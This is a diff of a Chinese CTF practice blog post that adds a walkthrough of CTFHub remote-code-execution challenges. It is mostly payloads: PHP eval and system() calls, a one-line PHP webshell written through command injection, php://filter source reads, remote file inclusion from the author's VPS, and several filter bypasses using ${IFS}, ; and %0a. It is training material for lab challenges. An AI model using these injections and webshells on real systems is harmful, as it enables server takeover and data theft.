@@ -150,4 +150,75 @@
 <p>接着将提交后的url放入第二个框中<img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220119160825146.png" alt="image-20220119160825146"></p>
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20220119160834235.png" alt="image-20220119160834235"></p>
 <p>再在平台上面查看，成功在cookie中得到flag</p>
-</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-09-27</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/09/27/CTFHUB刷题记录/,2js56's blog,CTFHUB刷题记录,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/09/27/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/" title="[CISCN2019 华北赛区 Day2 Web1]Hack World复现">Post anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/09/14/sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/" title="sql注入进阶">Post siguiente</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p>给cmd赋一个值，直接执行一个系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls ../../../&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323021420270.png" alt="image-20220323021420270"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;cat ../../../flag_8890&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323021516030.png" alt="image-20220323021516030"></p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_REQUEST[&#x27;ctfhub&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有个shell.txt,访问发现有个参数ctfhub，于是利用文件包含，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>查目录，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat ../../../flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流.可以接收post请求作为输入流的输入，将请求作为PHP代码的输入传递给目标变量，以达到以post 的形式进行输入的目的。</p>
+<p>查看phpinfo，发现这两是打开的，说明方法可行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323022902971.png" alt="image-20220323022902971"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323022800329.png" alt="image-20220323022800329"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323022944285.png" alt="image-20220323022944285"></p>
+<h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p>这道题遇到过很多次同种类型了，用伪协议读取直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323023639259.png" alt="image-20220323023639259"></p>
+<p>再进行一个base64解码即可得到flag</p>
+<h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>在vps上创建一个文件写好系统命令，进行远程包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://xxx.xx.xx.xx/1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323024358532.png" alt="image-20220323024358532"></p>
+<p>得到flag</p>
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>看到有个php，于是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; cat 88281526027669.php</span><br></pre></td></tr></table></figure>
+
+<p>ping后无回显，于是base64转码一下，成功得到回显<img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323024907882.png" alt="image-20220323024907882"></p>
+<p>不过我还看到一个操作，也是可行的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;echo &quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot; &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>直接写个马进去</p>
+<p>蚁剑成功连接上<img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323025634684.png" alt="image-20220323025634684"></p>
+<p>这里可以看见，flag是被注释掉了，难怪第一种方法没有回显</p>
+<h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p>过滤cat关我tac什么事</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; tac flag_104451206227791.php|base64</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323030114451.png" alt="image-20220323030114451">写马的方式也一样能用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;echo &quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot; &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323030316086.png" alt="image-20220323030316086"></p>
+<h2 id="过滤空格-1"><a href="#过滤空格-1" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>能代替空格的可就太多了，这里我们用的是${IFS}</p>
+<p><code>?ip=127.0.0.1$&#123;IFS&#125;%26$&#123;IFS&#125;ls#</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323030703618.png" alt="image-20220323030703618"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1$&#123;IFS&#125;&amp;$&#123;IFS&#125;cat$&#123;IFS&#125;flag_22372299923305.php|base64</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/image-20220323031022662.png" alt="image-20220323031022662"></p>
+<h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; cd flag_is_here;ls;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; cd flag_is_here;cat flag_20743402023207.php|base64</span><br></pre></td></tr></table></figure>
+
+<p>但是思来想去，这些过滤都没有防范我写马进去，甚至payload都不用变</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;echo &quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot; &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>&amp;被过滤，用;代替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+<p>127.0.0.1;cat flag_35923221712564.php|base64   &#x3D;   127.0.0.1;base64 flag_35923221712564.php </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;base64 flag_7518163641606.php</span><br></pre></td></tr></table></figure>
+
+<p>一样的可以写马</p>
+<h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>就是一个疯狂加过滤的题，考虑使用编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0acd$&#123;IFS&#125;f???_is_here%0als</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0acd$&#123;IFS&#125;f???_is_here%0abase64$&#123;IFS&#125;f???_8886214875044.php%0a</span><br></pre></td></tr></table></figure></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-09-27</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/09/27/CTFHUB刷题记录/,2js56's blog,CTFHUB刷题记录,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/09/27/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/" title="[CISCN2019 华北赛区 Day2 Web1]Hack World复现">Post anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/09/14/sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/" title="sql注入进阶">Post siguiente</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
